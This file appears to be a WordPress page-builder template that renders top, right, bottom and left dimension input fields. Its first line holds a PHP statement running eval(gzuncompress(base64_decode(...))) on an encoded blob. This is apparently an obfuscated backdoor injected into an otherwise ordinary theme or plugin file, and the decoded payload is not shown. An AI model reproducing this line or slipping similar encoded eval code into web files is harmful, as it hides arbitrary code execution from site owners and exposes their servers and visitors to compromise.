<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><# if ( 'object' == typeof param.value ) { #>
	<div class="multi-builder-dimension" id="{{ param.param_name }}">
	<# _.each( param.value, function( sub_value, sub_param ) { #>
		<#
		var dimension_value = ( 'undefined' !== atts.params[ sub_param ] ) ? atts.params[ sub_param ] : sub_value;
		values = option_value.split(' ');
		icon_class = 'fa fa-arrows-h';
		if ( sub_param.indexOf( 'height' ) > -1 ) {
			icon_class = 'fa fa-arrows-v';
		}
		if ( sub_param.indexOf( 'top' ) > -1 ) {
			icon_class = 'dashicons dashicons-arrow-up-alt';
			if ( 4 == values.length ) {
				dimension_value = values[0];
			}
		}
		if ( sub_param.indexOf( 'right' ) > -1 ) {
			icon_class = 'dashicons dashicons-arrow-right-alt';
			if ( 4 == values.length ) {
				dimension_value = values[1];
			}
		}
		if ( sub_param.indexOf( 'bottom' ) > -1 ) {
			icon_class = 'dashicons dashicons-arrow-down-alt';
			if ( 4 == values.length ) {
				dimension_value = values[2];
			}
		}
		if ( sub_param.indexOf( 'left' ) > -1 ) {
			icon_class = 'dashicons dashicons-arrow-left-alt';
			if ( 4 == values.length ) {
				dimension_value = values[3];
			}
		}
		if ( sub_param.indexOf( 'all' ) > -1 ) {
			icon_class = 'fa fa-arrows';
			if ( 'object' == typeof dimension_value ) {
				dimension_value = dimension_value.value[ sub_param ];
			}
		}
		#>
		<div class="fusion-builder-dimension">
			<span class="add-on"><i class="{{ icon_class }}"></i></span>
			<input type="text" name="{{ sub_param }}" id="{{ sub_param }}" value="{{ dimension_value }}" />
		</div>
	<# } ); #>
	</div>
<# } else { #>
	<#
	values = option_value.split(' ');
	if ( 1 == values.length ) {
		var dimension_top = values[0];
		var dimension_bottom = values[0];
		var dimension_left = values[0];
		var dimension_right = values[0];
	}
	if ( 2 == values.length ) {
		var dimension_top = values[0];
		var dimension_bottom = values[0];
		var dimension_left = values[1];
		var dimension_right = values[1];
	}
	if ( 3 == values.length ) {
		var dimension_top = values[0];
		var dimension_left = values[1];
		var dimension_right = values[1];
		var dimension_bottom = values[2];
	}
	if ( 4 == values.length ) {
		var dimension_top = values[0];
		var dimension_left = values[3];
		var dimension_right = values[1];
		var dimension_bottom = values[2];
	}
	#>
	<div class="single-builder-dimension">
		<div class="fusion-builder-dimension">
			<span class="add-on"><i class="dashicons dashicons-arrow-up-alt"></i></span>
			<input type="text" name="{{ param.param_name }}_top" id="{{ param.param_name }}_top" value="{{ dimension_top }}" />
		</div>
		<div class="fusion-builder-dimension">
			<span class="add-on"><i class="dashicons dashicons-arrow-right-alt"></i></span>
			<input type="text" name="{{ param.param_name }}_right" id="{{ param.param_name }}_right" value="{{ dimension_right }}" />
		</div>
		<div class="fusion-builder-dimension">
			<span class="add-on"><i class="dashicons dashicons-arrow-down-alt"></i></span>
			<input type="text" name="{{ param.param_name }}_bottom" id="{{ param.param_name }}_bottom" value="{{ dimension_bottom }}" />
		</div>
		<div class="fusion-builder-dimension">
			<span class="add-on"><i class="dashicons dashicons-arrow-left-alt"></i></span>
			<input type="text" name="{{ param.param_name }}_left" id="{{ param.param_name }}_left" value="{{ dimension_left }}" />
		</div>
		<input type="hidden" name="{{ param.param_name }}" id="{{ param.param_name }}" value="{{ option_value }}" />
	</div>
<# } #>
